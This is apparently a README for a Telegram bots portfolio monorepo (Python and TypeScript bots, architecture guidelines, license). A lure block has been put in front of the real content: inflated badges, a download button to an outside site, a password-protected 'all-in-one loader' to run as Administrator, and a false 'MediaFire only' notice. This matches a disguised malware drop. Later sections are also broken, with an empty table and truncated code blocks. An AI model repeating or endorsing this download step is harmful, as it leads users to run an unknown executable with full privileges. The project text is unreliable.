<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 🤖 Telegram Bots Portfolio Showcase

A curated monorepo showcasing production-grade, asynchronous Telegram bots built with **Python (`aiogram v3`)** and **TypeScript (`grammY`)**, deployed with modern cloud serverless and container architectures. 

Designed with modular architectures, embedded SQLite persistence, and a hybrid execution engine (instant local Long Polling with seamless Webhook deployment).

---

## 🏛️ Monorepo Architecture

This repository adopts a modular **`apps/`** monorepo pattern. Each bot project operates independently with its own runtime dependencies, configuration schema, and container specification:

```
telegram-bots/
├── .github/
│   └── workflows/
│       └── webhook-watchdog.yml     # 🛡️ 24/7 Failover watchdog & 60-day keepalive
├── apps/
│   ├── music-downloader-bot/        # 🎵 Music Discovery & Audio Downloader (TypeScript + Node 22 + grammY)
│   │   ├── api/index.ts             # ⚡ Vercel Serverless Webhook Adapter
│   │   ├── src/                     # Handlers, Deezer/iTunes/Saavn stream resolver, LRCLIB lyrics, UserService
│   │   ├── tests/                   # 45/45 Vitest Unit & Webhook Tests
│   │   ├── package.json
│   │   ├── PLAN.md                  # Comprehensive 10-Phase Roadmap
│   │   └── vercel.json
│   └── speaking-coach-bot/          # 🎙️ AI Speaking Coach (Python 3.13 + Gemini 3.1 Flash-Lite Multimodal Audio)
│       ├── api/
│       │   └── index.py             # ⚡ FastAPI Vercel Serverless Webhook Adapter
│       ├── src/
│       │   ├── bot/                 # Handlers (voice notes, tenses, phonemes, IELTS, reminders)
│       │   ├── services/            # Gemini audio analysis, TTS, user XP, streaks, dialogue FSM
│       │   ├── repositories/        # Dual SQLite / Neon PostgreSQL repository factory
│       │   └── config.py            # Pydantic environment validation & port bindings
│       ├── tests/                   # 77/77 Comprehensive Unit & Webhook Tests
│       ├── main.py                  # Local Polling & Docker Webhook runner
│       ├── manage_webhook.py        # CLI for primary/fallback webhook management
│       ├── vercel.json              # Vercel serverless rewrite rules
│       ├── compose.yaml
│       ├── Dockerfile
│       ├── requirements.txt
│       ├── .env.example
│       └── README.md
├── .gitignore
├── LICENSE                          # Proprietary portfolio license
└── README.md
```

---

## 📦 Showcase Catalog

| Bot Project | Stack | Highlights | Status & Live Bot |
| :--- | :--- | :--- | :--- |
## ⚡ Core Features

- **Hybrid Operational Modes**:
  - **Local Development**: Instant **Long Polling** without requiring public domains, ngrok, or SSL certificates.
  - **Production Deployment**: Switch to **Webhooks** simply by setting `BOT_MODE=webhook` and `WEBHOOK_URL` in `.env`.
- **Zero-Config Database**: Embedded SQLite tracking registered users, message frequencies, first-seen timestamps, and activity analytics.
- **Interactive UI**: Inline button menus with dynamic callbacks and real-time latency ping diagnostics.
- **Docker Ready**: Individual Dockerfiles and modular Docker Compose services configured per application.

---

## 🚀 Quick Start Guide

### Step 1: Clone Repository
```bash
### Option A: Run the AI Speaking Coach Bot (Local Python venv)

> [!IMPORTANT]
> **Virtual Environment (`venv`) WAJIB DIGUNAKAN:**
> Jangan install paket Python langsung ke environment global OS untuk menghindari konflik dependensi antar bot atau error PEP 668 (`externally-managed-environment`).

```bash
cd apps/speaking-coach-bot

# 1. Buat virtual environment (wajib)
python -m venv venv

# 2. Aktifkan venv
# Windows (PowerShell):
.\venv\Scripts\Activate.ps1
# (Jika muncul batasan skrip di PowerShell: Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass)

# Linux / macOS:
source venv/bin/activate

# 3. Install dependencies ke dalam venv:
pip install -r requirements.txt

# 4. Konfigurasi kredensial di .env
# Isi BOT_TOKEN (dari @BotFather) dan GEMINI_API_KEY (dari Google AI Studio)

# 5. Jalankan bot:
python main.py
```

### Option B: Run the Music Discovery & Downloader Bot (TypeScript / Node.js)

```bash
cd apps/music-downloader-bot

# 1. Install dependencies:
npm install

# 2. Jalankan automated unit tests:
npm test

# 3. Konfigurasi kredensial di .env:
# Salin .env.example ke .env dan isi BOT_TOKEN dari @BotFather

# 4. Jalankan bot (Local Polling):
npm run dev
```

### Option C: Run via Docker Compose (Speaking Coach Bot)
Jalankan bot beserta stack dependensinya menggunakan Docker Compose langsung dari foldernya:
```bash
cd apps/speaking-coach-bot
docker compose up -d
```

### Option D: 100% Free Production Cloud Deployment (Vercel + Neon PostgreSQL)
Speaking Coach AI Bot beroperasi 24/7 di infrastruktur cloud serverless tanpa biaya dan tanpa kartu kredit:
## 🎮 Standard Command Reference

Core commands implemented in the bot suite:

| Command | Action |
| :--- | :--- |
| `/start` | Welcomes user and displays inline menu (activity auto-tracked via middleware) |
| `/help` | Detailed command manual and usage instructions |
| `/status` | Measures real-time round-trip latency (ping), active mode, and registered user count |
| `/stats` | Fetches personal interaction statistics and timestamps via domain service |
| `/about` | Displays project architecture, author information, and portfolio license |

---

## 🏗️ Architectural Guidelines

All bots in this repository adhere to production-ready enterprise standards:

### 1. Baseline Standard: Clean / Layered Architecture
Every bot is strictly organized into decoupled layers:
```text
src/
├── bot/
│   ├── handlers/      # Transport / Telegram commands & events
│   ├── middleware/    # Auth, user tracking, rate-limiting, error logging
│   └── keyboards/     # Inline & reply keyboards
├── services/          # Pure business logic (framework & Telegram agnostic)
├── repositories/      # Data access layer (SQL / ORM queries)
├── config.ts          # Typed configuration loader
└── index.ts           # Bootstrapper & entrypoint
tests/                 # Unit & integration tests
```
* **Strict Production Rules**:
  - `handlers/` must **never** call database queries directly; they must delegate to `services/`.
  - `services/` must **never** reference Telegram objects (`ctx`, `Message`, `Bot`); they accept pure DTOs/primitives to guarantee testability.
  - `repositories/` abstract database drivers so DB engines (SQLite to PostgreSQL/Prisma) can be swapped without touching business logic.
  - Cross-cutting concerns (user activity logging, latency) must be handled in `middleware/`, keeping handlers focused.

### 2. Scaling Path: Vertical Slice Architecture (Feature-First)
When an individual bot grows into a multifunctional application (e.g., e-commerce, AI assistant, subscriptions), transition to feature slices:
```text
src/
├── features/
│   ├── ai-chat/       # handler, service, model client
│   ├── subscription/  # handler, service, invoice gateway, repo
│   └── moderation/    # handler, filters, anti-spam rules
├── shared/            # Shared DB connection, middleware, utilities
└── index.ts
```

### 3. Interactive Pattern: FSM / Conversation Scene Architecture (State-Driven)
For multi-step dialogs (registration wizards, quiz flows, checkout forms):
* **Best For**: Step-by-step user interactions requiring state memory between messages.
* **Framework Implementations**:
  - **Python**: `aiogram.fsm` (`StatesGroup`, `FSMContext` backed by Memory / Redis / SQLite).
  - **TypeScript**: `@grammyjs/conversations` (linear async/await conversation runner) or Scenes.
* **Structure**:
  ```text
  src/
  ├── bot/
  │   └── conversations/     # Multi-step conversational wizards
  │       ├── kyc-flow.ts    # Step 1: Name -> Step 2: ID card -> Step 3: Confirmation
  │       └── order-flow.ts
  ```
* **Rule**: Store session state in persistent storage (e.g., Redis or SQLite) rather than process memory so active dialogues survive container restarts.

### 4. High-Throughput Pattern: Queue-Worker / Event-Driven Architecture
Essential for heavy workloads such as media downloaders (YouTube, TikTok), video/audio transcoding, PDF conversions, scraping, or heavy AI/LLM generation:
* **The Telegram Constraint**: Telegram webhooks strictly require HTTP 200 response within 3–5 seconds. Long-running tasks executed directly in the update handler will trigger webhook timeouts and infinite duplicate update retries.
* **Architecture Flow**:
  ```
  [ Telegram User ]
         │
         ▼
  [ Webhook / Polling Receiver ] ──► Instant reply (< 2s): "Processing your request... ⏳"
         │
         ▼ (Push Job)
  [ Queue: Redis / BullMQ / Celery ]
         │
         ▼ (Asynchronous Consumption)
  [ Background Workers (1..N) ] ──► Heavy download / transcoding / AI inference
         │
         ▼ (On Complete)
  [ Telegram Bot API ] ──► Sends final file or result back to the user
  ```
* **Rule**: Decouple the update listener from execution workers. Handlers only validate commands, enqueue jobs, and return immediate user feedback.

### 5. Multi-Platform Pattern: Hexagonal / Omni-Channel Architecture
When the bot's core service must be accessible across multiple chat apps (Telegram, WhatsApp, Discord, or Web):
* Keep the **Core Domain** completely independent of any messaging platform.
* Implement Telegram as a *Driving Adapter* alongside WhatsApp and Discord adapters.

---

### 📊 Architecture Selection Matrix

| Pattern | Primary Focus | Best Use Cases |
| :--- | :--- | :--- |
| **Clean / Layered** | Code quality & testability | Standard bots, business rules, structured CRUD |
| **Vertical Slice** | Modularity & domain isolation | Large super-bots with independent feature modules |
| **FSM / Conversations** | Multi-step interactive dialogs | KYC, surveys, multi-step booking, onboarding wizards |
| **Queue-Worker** | Performance & latency prevention | Media downloaders, video/audio convert, AI LLM processing |
| **Hexagonal** | Omni-channel flexibility | Shared bots across Telegram, WhatsApp, and Discord |

---

## 💡 Project Roadmap & Exploration Ideas

| # | Proyek | Nilai Portofolio | Monetisasi | Dipakai Sendiri | Keseruan | Kompleksitas | Status |
| :-: | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **1** | Bot pesanan UMKM + dashboard (katalog, keranjang, pembayaran, dashboard pemilik) | Tinggi | Tinggi | Rendah | Sedang | Sedang | 📋 Planned |
## 📄 License & Terms

Copyright (c) 2026 Tino Nurcahya. All rights reserved.

This project and its code are proprietary and confidential. It is made available solely for portfolio demonstration and personal evaluation purposes. This project is strictly **NOT** intended for commercial use. Unauthorized copying, modification, distribution, commercial exploitation, or use of this file and its codebase via any medium is strictly prohibited.


---

Copyright (c) 2026 Tino Nurcahya. All rights reserved.

This repository and its codebase are proprietary and created solely for portfolio demonstration and personal evaluation purposes.

Permission is hereby granted to view, review, and evaluate the code for recruitment, educational assessment, and portfolio evaluation purposes.

Unauthorized copying, distribution, sublicensing, commercial exploitation, or public deployment of this codebase or any part thereof, in source or binary forms, with or without modification, is strictly prohibited without prior written permission from the copyright holder.

For inquiries or permissions, please contact: tinonurcahya.ti@gmail.com
